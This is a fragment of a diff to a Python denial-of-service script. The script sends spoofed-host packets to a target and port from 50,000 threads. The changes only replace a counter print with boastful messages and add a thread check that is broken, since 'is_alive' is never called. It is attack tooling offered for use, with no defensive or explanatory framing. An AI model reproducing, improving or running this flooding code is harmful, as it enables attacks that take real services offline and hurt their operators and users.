@@ -19,10 +19,13 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         global attack_num
         attack_num += 1
-        print(attack_num)
+        print("DDOSING HARDER THAN A PLUS T RB")
         s.close()
         
 for i in range(50000):
     thread = threading.Thread(target=attack)
     thread.start()
-
+    if(thread.is_alive):
+        print("STILL GOING BABY!!!!")
+    else:
+        thread.start()
